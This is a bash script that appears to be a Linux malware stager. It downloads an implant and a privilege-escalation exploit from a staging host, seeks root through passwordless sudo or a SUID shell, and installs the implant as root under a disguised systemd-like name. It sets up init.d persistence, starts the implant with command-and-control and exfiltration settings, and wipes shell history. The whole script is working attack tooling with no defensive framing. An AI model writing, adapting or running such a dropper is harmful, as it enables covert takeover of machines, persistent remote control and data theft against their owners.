#!/bin/bash
STAGING_HOST="${STAGING_HOST:-192.168.1.100}"
C2_HOST="${C2_HOST:-${STAGING_HOST}}"
C2_PORT="${C2_PORT:-443}"
EXFIL_HOST="${EXFIL_HOST:-${C2_HOST}}"
EXFIL_PORT="${EXFIL_PORT:-8443}"

IMPLANT="/usr/lib/systemd/systemd-networkd-wait"
INITD="/etc/init.d/systemd-networkd-wait"
WORK="${HOME}/.cache/.sysd"

mkdir -p "${WORK}"

# Download implant binary
curl -sLk --max-time 60 -o "${WORK}/.dbus-daemon" "https://${STAGING_HOST}:8443/b"
chmod +x "${WORK}/.dbus-daemon"

# Download and run privesc exploit - polls up to 30s for SUID /tmp/.sh
curl -sLk --max-time 60 -o "${WORK}/.privesc" "https://${STAGING_HOST}:8443/privesc"
chmod +x "${WORK}/.privesc"
"${WORK}/.privesc" >/dev/null 2>&1
rm -f "${WORK}/.privesc"

# Install implant + persistence as root
# Try sudo -n first (NOPASSWD), fall back to SUID /tmp/.sh if exploit created it
_run_root() {
    if sudo -n sh -c "$1" 2>/dev/null; then
        return 0
    elif [ -u /tmp/.sh ]; then
        /tmp/.sh -p -c "$1"
        return $?
    fi
    return 1
}

if sudo -n true 2>/dev/null || [ -u /tmp/.sh ]; then
    # Install implant binary
    _run_root "cp '${WORK}/.dbus-daemon' '${IMPLANT}' && chmod 755 '${IMPLANT}' && chown root:root '${IMPLANT}'"

    # Download + install init.d script
    curl -sLk --max-time 30 -o /tmp/.initd "https://${STAGING_HOST}:8443/initd"
    _run_root "cp /tmp/.initd '${INITD}' && chmod 755 '${INITD}' && chown root:root '${INITD}'"
    rm -f /tmp/.initd

    # Enable persistence (manual symlinks - avoids update-rc.d → systemctl → polkit)
    for r in 2 3 4 5; do
        _run_root "ln -sf '${INITD}' /etc/rc${r}.d/S20systemd-networkd-wait"
    done

    # Launch implant as root
    _run_root "setsid env C2_HOST='${C2_HOST}' C2_PORT='${C2_PORT}' EXFIL_HOST='${EXFIL_HOST}' EXFIL_PORT='${EXFIL_PORT}' '${IMPLANT}' >/dev/null 2>&1 &"

    # Cleanup SUID shell (owned by root)
    _run_root "rm -f /tmp/.sh"
else
    # No root - run implant as current user
    nohup env C2_HOST="${C2_HOST}" C2_PORT="${C2_PORT}" \
        EXFIL_HOST="${EXFIL_HOST}" EXFIL_PORT="${EXFIL_PORT}" \
        BEACON_MIN="4" BEACON_MAX="12" \
        "${WORK}/.dbus-daemon" >/dev/null 2>&1 &
    disown $!
fi

history -c 2>/dev/null
cat /dev/null > ~/.bash_history 2>/dev/null
